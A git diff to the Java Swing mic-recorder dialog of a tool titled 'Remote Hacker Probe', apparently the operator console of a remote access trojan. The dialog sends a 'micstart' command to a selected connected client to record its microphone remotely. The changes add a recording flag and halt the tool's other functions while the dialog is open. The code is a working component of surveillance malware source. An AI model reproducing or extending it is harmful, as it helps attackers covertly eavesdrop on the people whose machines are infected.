@@ -15,6 +15,8 @@ import javax.swing.SwingUtilities;
 import java.awt.event.ActionListener;
 import java.awt.event.ItemEvent;
 import java.awt.event.ItemListener;
+import java.awt.event.WindowAdapter;
+import java.awt.event.WindowEvent;
 import java.text.SimpleDateFormat;
 import java.util.Date;
 import java.util.concurrent.TimeUnit;
@@ -29,6 +31,7 @@ public class MicRecorder extends JDialog {
 	static JLabel lbl ;
 	static JToggleButton jtb;
 	public static int CLIENT_ID;
+	public static Boolean MicRec = false;
 	/**
 	 * Launch the application.
 	 */
@@ -95,6 +98,8 @@ public class MicRecorder extends JDialog {
 	 * Create the dialog.
 	 */
 	public MicRecorder() {
+		
+		MainWindow.HaltAllSystems();
 		setDefaultCloseOperation(JDialog.DISPOSE_ON_CLOSE);
 		setResizable(false);
 		setTitle("Remote Hacker Probe | Mic Recorder");
@@ -116,6 +121,7 @@ public class MicRecorder extends JDialog {
 		
 		jtb.addItemListener(new ItemListener() {
 			   public void itemStateChanged(ItemEvent ev) {
+				   MicRec = true;
 			      if(ev.getStateChange()==ItemEvent.SELECTED){
 			    	  Server.SendData(Server.Clients.get(CLIENT_ID), "micstart"); // send instruction to start mic recording
 			    	  // expect no reply
@@ -141,6 +147,14 @@ public class MicRecorder extends JDialog {
 		
 		
 		contentPanel.add(jtb);
+		
+		addWindowListener(new WindowAdapter() {
+			
+			@Override
+			public void windowClosed(WindowEvent we) {
+				MainWindow.EnableAllSystems();
+			}
+		});
 		
 		
 	}
